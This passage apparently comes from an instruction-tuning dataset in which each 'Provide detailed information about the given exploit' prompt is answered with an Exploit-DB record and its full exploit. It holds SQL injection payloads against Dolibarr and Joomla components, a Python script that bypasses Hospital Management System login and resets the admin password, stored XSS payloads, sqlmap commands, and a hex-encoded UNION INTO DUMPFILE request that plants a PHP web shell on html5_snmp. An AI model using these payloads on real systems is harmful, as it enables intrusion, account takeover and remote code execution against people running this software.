WHERE, HAVING, ORDER BY or\nGROUP BY clause\n    Payload:\ntoken=$2y$10$hG2u8WGSj3ynCl99dYPZGejK322YaCxkfSRW/IC0mt8vk7/GTtU8a&action=update&id=774&ref_ext=&actioncode=AC_OTH_AUTO'\nRLIKE (SELECT (CASE WHEN (5096=5096) THEN 0x41435f4f54485f4155544f ELSE\n0x28 END))--\nHQaG&label=Product+created&ap=09/05/2019&apday=05&apmonth=09&apyear=2019&aphour=16&apmin=59&apsec=10&p2=09/05/2019&p2day=05&p2month=09&p2year=2019&p2hour=16&p2min=59&p2sec=10&complete=-1&location=&removedassigned=&assignedtouser=-1&socid=-1&projectid=0&priority=&fk_element=178&elementtype=product&note=Author%3A+admin%3Cbr%3E%0D%0AProduct+created&edit=Save\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP\nBY clause (FLOOR)\n    Payload:\ntoken=$2y$10$hG2u8WGSj3ynCl99dYPZGejK322YaCxkfSRW/IC0mt8vk7/GTtU8a&action=update&id=774&ref_ext=&actioncode=AC_OTH_AUTO'\nAND (SELECT 1665 FROM(SELECT COUNT(*),CONCAT(0x716b707871,(SELECT\n(ELT(1665=1665,1))),0x7170707071,FLOOR(RAND(0)*2))x FROM\nINFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\nXqJd&label=Product+created&ap=09/05/2019&apday=05&apmonth=09&apyear=2019&aphour=16&apmin=59&apsec=10&p2=09/05/2019&p2day=05&p2month=09&p2year=2019&p2hour=16&p2min=59&p2sec=10&complete=-1&location=&removedassigned=&assignedtouser=-1&socid=-1&projectid=0&priority=&fk_element=178&elementtype=product&note=Author%3A+admin%3Cbr%3E%0D%0AProduct+created&edit=Save\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload:\ntoken=$2y$10$hG2u8WGSj3ynCl99dYPZGejK322YaCxkfSRW/IC0mt8vk7/GTtU8a&action=update&id=774&ref_ext=&actioncode=AC_OTH_AUTO'\nAND (SELECT 6833 FROM (SELECT(SLEEP(5)))gCwf)--\njPLl&label=Product+created&ap=09/05/2019&apday=05&apmonth=09&apyear=2019&aphour=16&apmin=59&apsec=10&p2=09/05/2019&p2day=05&p2month=09&p2year=2019&p2hour=16&p2min=59&p2sec=10&complete=-1&location=&removedassigned=&assignedtouser=-1&socid=-1&projectid=0&priority=&fk_element=178&elementtype=product&note=Author%3A+admin%3Cbr%3E%0D%0AProduct+created&edit=Save\n\n.\n.\n.\n.\n.\n\ndemand_reason_id, availability_id (POST) - Sql injection PoC\n\nhttp request:\n\nPOST /dolibarr-10.0.1/htdocs/comm/propal/card.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101\nFirefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer:\nhttp://localhost/dolibarr-10.0.1/htdocs/comm/propal/card.php?action=create&leftmenu=propals\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 471\nCookie:\nDOLSESSID_60ec554596b730ca6f03816d85cd400a=aaf3a3b284478257b59be81cf1a70fc3\nConnection: close\nUpgrade-Insecure-Requests: 1\n\ntoken=%242y%2410%24L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09%2F09%2F2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=[SQLi]&availability_id=[SQLi]&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty\n\n\n\nParameter: demand_reason_id (POST)\n    Type: boolean-based blind\n    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or\nGROUP BY clause\n    Payload:\ntoken=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0\nRLIKE (SELECT (CASE WHEN (8405=8405) THEN 0 ELSE 0x28\nEND))&availability_id=0&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty\n\n    Type: error-based\n    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP\nBY clause (FLOOR)\n    Payload:\ntoken=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0\nOR (SELECT 8076 FROM(SELECT COUNT(*),CONCAT(0x716a626b71,(SELECT\n(ELT(8076=8076,1))),0x71787a7871,FLOOR(RAND(0)*2))x FROM\nINFORMATION_SCHEMA.PLUGINS GROUP BY\nx)a)&availability_id=0&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty\n\n.\n.\n\nParameter: availability_id (POST)\n    Type: boolean-based blind\n    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or\nGROUP BY clause\n    Payload:\ntoken=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0&availability_id=0\nRLIKE (SELECT (CASE WHEN (6909=6909) THEN 0 ELSE 0x28\nEND))&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty\n\n    Type: error-based\n    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP\nBY clause (FLOOR)\n    Payload:\ntoken=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0&availability_id=0\nOR (SELECT 3789 FROM(SELECT COUNT(*),CONCAT(0x716a626b71,(SELECT\n(ELT(3789=3789,1))),0x71787a7871,FLOOR(RAND(0)*2))x FROM\nINFORMATION_SCHEMA.PLUGINS GROUP BY\nx)a)&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload:\ntoken=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0&availability_id=0\nAND (SELECT 9904 FROM\n(SELECT(SLEEP(5)))ZKPW)&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47836",
        "output": {
            "ID": "47836",
            "File": "exploits/php/webapps/47836.py",
            "Description": "Hospital Management System 4.0 - Authentication Bypass",
            "Date Published": "2020-01-01",
            "Author": "Metin Yunus Kandemir",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2020-01-01",
            "Date Updated": "2020-02-07",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Hospital Management System 4.0 - Authentication Bypass\n# Exploit Author: Metin Yunus Kandemir (kandemir)\n# Vendor Homepage: https://phpgurukul.com/\n# Software Link: https://phpgurukul.com/hospital-management-system-in-php/\n# Version: v4.0\n# Category: Webapps\n# Tested on: Xampp for Windows\n\n# Description:\n# Password and username parameters have sql injection vulnerability on admin panel.\n# username: joke' or '1'='1 , password: joke' or '1'='1\n# Exploit changes password of admin user.\n\n\n\n#!/usr/bin/python\n\nimport requests\nimport sys\n\n\nif (len(sys.argv) !=2) or sys.argv[1] == \"-h\":\nprint \"[*] Usage: PoC.py rhost/rpath\"\nprint \"[*] e.g.: PoC.py 127.0.0.1/hospital\"\nexit(0)\n\nrhost = sys.argv[1]\n\nnpasswd = str(raw_input(\"Please enter at least six characters for new password: \"))\n\nurl = \"http://\"+rhost+\"/hms/admin/index.php\"\ndata = {\"username\": \"joke' or '1'='1\", \"password\": \"joke' or '1'='1\", \"submit\": \"\", \"submit\": \"\"}\n\n\n#login\n\nwith requests.Session() as session:\nlpost = session.post(url=url, data=data, headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"})\n\n#check authentication bypass\n\ncheck = session.get(\"http://\"+rhost+\"/hms/admin/dashboard.php\", allow_redirects=False)\nprint (\"[*] Status code: %s\"%check.status_code)\n\nif check.status_code == 200:\nprint \"[+] Authentication bypass was successful!\"\nprint \"[+] Trying to change password.\"\nelif check.status_code == 404:\nprint \"[-] One bad day! Check target web application path.\"\nsys.exit()\nelse:\nprint \"[-] One bad day! Authentication bypass was unsuccessful! Try it manually.\"\nsys.exit()\n\n#change password\n\ncgdata = {\"cpass\": \"joke' or '1'='1\", \"npass\": \"\"+npasswd+\"\", \"cfpass\": \"\"+npasswd+\"\",\"submit\":\"\"}\ncgpasswd = session.post(\"http://\"+rhost+\"/hms/admin/change-password.php\", data=cgdata, headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"})\nif cgpasswd.status_code == 200:\nprint (\"[+] Username is: admin\")\n  print (\"[+] New password is: %s\"%npasswd)\n        else:\nprint \"[-] One bad day! Try it manually.\"\nsys.exit()\n\nhospital_poc.py\n\n#!/usr/bin/python\n\nimport requests\nimport sys\n\n\nif (len(sys.argv) !=2) or sys.argv[1] == \"-h\":\n\tprint \"[*] Usage: PoC.py rhost/rpath\"\n\tprint \"[*] e.g.: PoC.py 127.0.0.1/hospital\"\n\texit(0) \n\nrhost = sys.argv[1]\n\nnpasswd = str(raw_input(\"Please enter at least six characters for new password: \"))\n\nurl = \"http://\"+rhost+\"/hms/admin/index.php\"\ndata = {\"username\": \"joke' or '1'='1\", \"password\": \"joke' or '1'='1\", \"submit\": \"\", \"submit\": \"\"} \n\n\n#login\n\nwith requests.Session() as session:\n\tlpost = session.post(url=url, data=data, headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"})\n\t\n\t#check authentication bypass\n\n\tcheck = session.get(\"http://\"+rhost+\"/hms/admin/dashboard.php\", allow_redirects=False)\n\tprint (\"[*] Status code: %s\"%check.status_code)\n\n\tif check.status_code == 200:\n\t\tprint \"[+] Authentication bypass was successful!\"\n\t\tprint \"[+] Trying to change password.\"\n\telif check.status_code == 404:\n\t\tprint \"[-] One bad day! Check target web application path.\"\n\t\tsys.exit()\n\telse:\n\t\tprint \"[-] One bad day! Authentication bypass was unsuccessful! Try it manually.\"\n\t\tsys.exit()\n\t\n\t#change password\n\n\tcgdata = {\"cpass\": \"joke' or '1'='1\", \"npass\": \"\"+npasswd+\"\", \"cfpass\": \"\"+npasswd+\"\",\"submit\":\"\"}\n\tcgpasswd = session.post(\"http://\"+rhost+\"/hms/admin/change-password.php\", data=cgdata, headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"})\n\tif cgpasswd.status_code == 200:\n\t\tprint (\"[+] Username is: admin\")\n  \t\tprint (\"[+] New password is: %s\"%npasswd)\n        else:\n\t\tprint \"[-] One bad day! Try it manually.\"\n\t\tsys.exit()"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47587",
        "output": {
            "ID": "47587",
            "File": "exploits/php/webapps/47587.txt",
            "Description": "html5_snmp 1.11 - 'Remark' Persistent Cross-Site Scripting",
            "Date Published": "2019-11-05",
            "Author": "cakes",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-11-05",
            "Date Updated": "2019-11-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comhtml5_snmp-master.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: html5_snmp 1.11 - 'Remark' Persistent Cross-Site Scripting\n# Date: 2019-11-01\n# Exploit Author: Cakes\n# Vendor Homepage: https://github.com/lolypop55/html5_snmp\n# Software Link: https://github.com/lolypop55/html5_snmp.git\n# Version: 1.11\n# Tested on: CentOS 7\n# CVE: N/A\n\n# PoC\n\nPOST /add_router_operation.php HTTP/1.1\nHost: TARGET\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://TARGET/add_router.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 128\nCookie: submenu1=block; showips=10; showurls=10; showreferers=10; PHPSESSID=9m6bv15esubafglv5cnbcha421\nConnection: close\nUpgrade-Insecure-Requests: 1\nDNT: 1\n\n\nRouter_ID=ID&Router_Name=Name&Router_IP=IP&String=STRING&Remark=%3Cscript%3Ealert%28%22test5%22%29%3B%3C%2Fscript%3E&Submit=Save"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47588",
        "output": {
            "ID": "47588",
            "File": "exploits/php/webapps/47588.txt",
            "Description": "html5_snmp 1.11 - 'Router_ID' SQL Injection",
            "Date Published": "2019-11-05",
            "Author": "cakes",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-11-05",
            "Date Updated": "2019-11-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comhtml5_snmp-master.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: html5_snmp 1.11 - 'Router_ID' SQL Injection\n# Date: 2019-11-01\n# Exploit Author: Cakes\n# Vendor Homepage: https://github.com/lolypop55/html5_snmp\n# Software Link: https://github.com/lolypop55/html5_snmp.git\n# Version: 1.11\n# Tested on: CentOS 7\n# CVE: N/A\n\n# PoC for error, time, boolean and Union based SQL Injection\n\n# Parameter: Router_ID (POST)\n# Type: error-based\n# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n# Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)    \n    \nPayload: Router_ID=123' AND (SELECT 9724 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(9724=9724,1))),0x71717a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'aJYp'='aJYp&Router_Name=123&Router_IP=123&String=123&Remark=123&Submit=Save\n\n# Type: time-based blind\n# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])   \n    \nPayload: Router_ID=123' AND (SELECT 7074 FROM (SELECT(SLEEP(5)))hDkA) AND 'koRt'='koRt&Router_Name=123&Router_IP=123&String=123&Remark=123&Submit=Save\n\n# Parameter: Router_IP (GET)\n# Type: boolean-based blind\n# Title: AND boolean-based blind - WHERE or HAVING clause\n# Vector: AND [INFERENCE]   \n    \nPayload: Router_IP=192.168.0.1' AND 3390=3390-- yUHk\n    \n# Type: time-based blind\n# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    \n    \nPayload: Router_IP=192.168.0.1' AND (SELECT 2831 FROM (SELECT(SLEEP(5)))SwFp)-- VukE\n    \n# Type: UNION query\n# Title: Generic UNION query (NULL) - 5 columns\n# Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]    \n    \nPayload: Router_IP=192.168.0.1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a787071,0x4f4f4e6c58704e78566b76576358564c4e5145575543435658706d4e50476d6a6c65505366497571,0x7170717671),NULL-- BEdT\n\n# Pop a Shell :-)\n\nGET /get_router_show.php?Router_IP=%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%30%78%33%33%63%33%66%37%30%36%38%37%30%32%30%32%34%36%33%36%64%36%34%32%30%33%64%32%30%37%33%36%38%36%35%36%63%36%63%35%66%36%35%37%38%36%35%36%33%32%38%32%34%35%66%34%37%34%35%35%34%35%62%32%37%36%33%36%64%36%34%32%37%35%64%32%39%33%62%32%30%36%35%36%33%36%38%36%66%32%30%32%34%36%33%36%64%36%34%33%62%32%30%33%66%33%65%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%20%49%4e%54%4f%20%44%55%4d%50%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%73%6e%6d%70%30%31%2f%75%70%6c%6f%61%64%73%2f%65%78%65%63%2e%70%68%70%27%2d%2d%20%44%52%74%66 HTTP/1.1\nHost: Target\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://Target/get_router.php\nCookie: PHPSESSID=ii1kfjgplci8vbfep3ius67353\nConnection: close\nUpgrade-Insecure-Requests: 1\nDNT: 1\nCache-Control: max-age=0"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47311",
        "output": {
            "ID": "47311",
            "File": "exploits/php/webapps/47311.txt",
            "Description": "Jobberbase 2.0 CMS - 'jobs-in' SQL Injection",
            "Date Published": "2019-08-28",
            "Author": "Suvadip Kar",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-28",
            "Date Updated": "2020-02-03",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comjobberbase-2.0.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: Jobberbase 2.0 CMS - 'jobs-in' SQL Injection\n# Google Dork: N/A\n# Date: 28, August 2019\n# Exploit Author: Suvadip Kar\n# Vendor Homepage:  http://jobberbase.com/\n# Software Link: https://github.com/filipcte/jobberbase/zipball/master\n# Version: 2.0\n# Tested on: Linux\n# CVE : N/A\n\n--------------------------------------------------------------------------------\n\n#POC - SQLi\n#Request: http://localhost/[PATH]/jobs/jobs-in/\n#Vulnerable Parameter: jobs-in (GET)\n#Payload: -4115\" UNION ALL SELECT 33,user()-- XYZ\n\n#EXAMPLE: http://localhost/[PATH]/jobs/jobs-in/-4115\" UNION ALL SELECT\n33,user()-- XYZ"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47232",
        "output": {
            "ID": "47232",
            "File": "exploits/php/webapps/47232.txt",
            "Description": "Joomla! Component JS Jobs (com_jsjobs) 1.2.5 - 'cities.php' SQL Injection",
            "Date Published": "2019-08-12",
            "Author": "qw3rTyTy",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-12",
            "Date Updated": "2019-08-12",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comjsjobs.zip",
            "Source URL": "",
            "Exploit": "#Exploit Title: Joomla! component com_jsjobs - SQL Injection\n#Dork: inurl:\"index.php?option=com_jsjobs\"\n#Date: 11.08.19\n#Exploit Author: qw3rTyTy\n#Vendor Homepage: https://www.joomsky.com/\n#Software Link: https://www.joomsky.com/5/download/1\n#Version: 1.2.5\n#Tested on: Debian/nginx/joomla 3.9.0\n#####################################\n#Vulnerability details:\n#####################################\nVulnerable code is in line 296 in file site/models/cities.php\n\n   291\t    function isCityExist($countryid, $stateid, $cityname){\n   292\t        if (!is_numeric($countryid))\n   293\t            return false;\n   294\t\n   295\t        $db = $this->getDBO();\n   296\t\t$query = \"SELECT id,name,latitude,longitude FROM `#__js_job_cities` WHERE countryid=\" . $countryid . \" AND LOWER(name) = '\" . strtolower($cityname) . \"'\";\t//!!!\n   297\t\n   298\t        if($stateid > 0){\n   299\t            $query .= \" AND stateid=\".$stateid;\n   300\t        }else{\n   301\t            $query .= \" AND (stateid=0 OR stateid IS NULL)\";\n   302\t\t}\n   303\t\t\n   305\t        $db->setQuery($query);\n   306\t        $city = $db->loadObject();\n   307\t        if ($city != null)\n   308\t            return $city;\n   309\t        else\n   310\t            return false;\n   311\t    }\n   312\t\n   313\t}\n\n#####################################\n#PoC:\n#####################################\nhttp://localhost/index.php?option=com_jsjobs&task=cities.savecity&citydata=%27%20UNION%20SELECT%20*%20FROM%20(SELECT%20user())%20AS%20a%20JOIN%20(SELECT%20version())%20as%20b%20JOIN%20(SELECT%20database())%20as%20c%20JOIN%20(SELECT%20%27woot%27)%20as%20d--%20,Canada"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47249",
        "output": {
            "ID": "47249",
            "File": "exploits/php/webapps/47249.txt",
            "Description": "Joomla! Component JS Jobs (com_jsjobs) 1.2.5 - 'customfields.php' SQL Injection",
            "Date Published": "2019-08-14",
            "Author": "qw3rTyTy",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-14",
            "Date Updated": "2019-08-14",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comjsjobs.zip",
            "Source URL": "",
            "Exploit": "#Exploit Title: Joomla! component com_jsjobs - 'customfields.php' SQL Injection\n#Dork: inurl:\"index.php?option=com_jsjobs\"\n#Date: 13.08.19\n#Exploit Author: qw3rTyTy\n#Vendor Homepage: https://www.joomsky.com/\n#Software Link: https://www.joomsky.com/5/download/1\n#Version: 1.2.5\n#Tested on: Debian/nginx/joomla 3.9.0\n#####################################\n#Vulnerability details:\n#####################################\nVulnerable code is in line 171 in file site/models/customfields.php\n\n   169\t    function dataForDepandantField( $val , $childfield){ \n   170\t        $db = $this->getDBO();\n   171\t        $query = \"SELECT userfieldparams,fieldtitle FROM `#__js_job_fieldsordering` WHERE field = '\".$childfield.\"'\";\t//!!!\n   172\t        $db->setQuery($query);\n   173\t        $data = $db->loadObject();\n\n#####################################\n#PoC:\n#####################################\n$> sqlmap.py -u \"http://localhost/index.php?option=com_jsjobs&task=customfields.datafordepandantfield&fvalue=0&child=0\" --random-agent --dbms=mysql --method GET -p child --technique E"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47218",
        "output": {
            "ID": "47218",
            "File": "exploits/php/webapps/47218.txt",
            "Description": "Joomla! Component JS Support Ticket (component com_jssupportticket) 1.1.5 - SQL Injection",
            "Date Published": "2019-08-08",
            "Author": "qw3rTyTy",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-08",
            "Date Updated": "2019-08-08",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comjssupportticket_jm.zip",
            "Source URL": "",
            "Exploit": "#Exploit Title: Joomla! component com_jssupportticket - SQL Injection\n#Dork: inurl:\"index.php?option=com_jssupportticket\"\n#Date: 08.08.19\n#Exploit Author: qw3rTyTy\n#Vendor Homepage: https://www.joomsky.com/\n#Software Link: https://www.joomsky.com/46/download/1.html\n#Version: 1.1.5\n#Tested on: Debian/nginx/joomla 3.9.0\n#####################################\n#Vulnerability details:\n#####################################\nVulnerable code is in line 441 in file admin/models/userfields.php\n\n   439\t    function dataForDepandantField( $val , $childfield){ \n   440\t        $db = $this->getDBO();\n   441\t        $query = \"SELECT userfieldparams,fieldtitle,field,depandant_field FROM `#__js_ticket_fieldsordering` WHERE field = '\".$childfield.\"'\"; //!!!\n   442\t        $db->setQuery($query);\n   443\t        $data = $db->loadObject();\n   444\t        $decoded_data = json_decode($data->userfieldparams); \n   445\t        $comboOptions = array(); \n   446\t        $flag = 0; \n   447\t        foreach ($decoded_data as $key => $value) { \n   448\t            if($key == $val){ \n   449\t               for ($i=0; $i < count($value) ; $i++) {  \n   450\t                if($flag == 0){\n   451\t                    $comboOptions[] = array('value' => '', 'text' => JText::_('Select').' '.$data->fieldtitle); \n   452\t                }\n   453\t                $comboOptions[] = array('value' => $value[$i], 'text' => $value[$i]); \n   454\t                $flag = 1; \n   455\t               } \n   456\t            } \n   457\t        }\n   458\t        $jsFunction = ''; \n   459\t        if ($data->depandant_field != null) {\n   460\t            $jsFunction = \"onchange=getDataForDepandantField('\" . $data->field . \"','\" . $data->depandant_field . \"',1);\";\n   461\t        }\n   462\t        $html = JHTML::_('select.genericList', $comboOptions , $childfield,'class=\"inputbox one\"'.$jsFunction, 'value' , 'text' ,'');\n   463\t        return $html; \n   464\t    }\n\n#####################################\n#PoC:\n#####################################\n$> sqlmap.py -u \"http://localhost/index.php?option=com_jssupportticket&c=ticket&task=datafordepandantfield&fvalue=0&child=0\" --random-agent -p child --dbms=mysql"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47222",
        "output": {
            "ID": "47222",
            "File": "exploits/php/webapps/47222.txt",
            "Description": "Joomla! Component JS Support Ticket (com_jssupportticket) 1.1.6 - 'ticketreply.php' SQL Injection",
            "Date Published": "2019-08-12",
            "Author": "qw3rTyTy",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-12",
            "Date Updated": "2019-08-12",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comjssupportticket_jm.zip",
            "Source URL": "",
            "Exploit": "#Exploit Title: Joomla! component com_jssupportticket - Authenticated SQL Injection\n#Dork: inurl:\"index.php?option=com_jssupportticket\"\n#Date: 10.08.19\n#Exploit Author: qw3rTyTy\n#Vendor Homepage: https://www.joomsky.com/\n#Software Link: https://www.joomsky.com/46/download/1.html\n#Version: 1.1.6\n#Tested on: Debian/nginx/joomla 3.9.0\n#####################################\n#Vulnerability details:\n#####################################\nVulnerable code is in line 31 in file admin/models/ticketreply.php\n\t\n\t...snip...\n    24\t    function storeTicketReplies($ticketid, $message, $created, $data2) {\n    25\t        if (!is_numeric($ticketid))\n    26\t            return false;\n    27\t\n    28\t        //validate reply for break down\n    29\t        $ticketrandomid   = $data2['ticketrandomid'];\t\t//!!!\n    30\t        $db = $this->getDBo();\n    31\t        $query = \"SELECT id FROM `#__js_ticket_tickets` WHERE ticketid='$ticketrandomid'\";\t//!!!\n    32\t        $db->setQuery($query);\n    33\t        $res = $db->loadResult();\n    34\t        if($res != $ticketid){\n    35\t            return false;\n    36\t        }//end\n    ...snip...\n\n#####################################\n#PoC:\n#####################################\n$> sqlmap.py -u \"http://localhost/index.php\" --random-agent --dbms=mysql --method POST --data 'option=com_jssupportticket&c=ticket&task=actionticket&Itemid=666&ticketid=666&callfrom=savemessage&message=woot&created=woot&ticketrandomid=woot&{VALID_FORMTOKEN_FROM_TICKETDETAIL}=1' -p ticketrandomid --cookie 'VALID_SESSION_ID=VALID_SESSION_ID'"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47386",
        "output": {
            "ID": "47386",
            "File": "exploits/php/webapps/47386.txt",
            "Description": "LimeSurvey 3.17.13 - Cross-Site Scripting",
            "Date Published": "2019-09-13",
            "Author": "SEC Consult",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-09-13",
            "Date Updated": "2019-09-13",
            "Verified": "1",
            "Codes": [
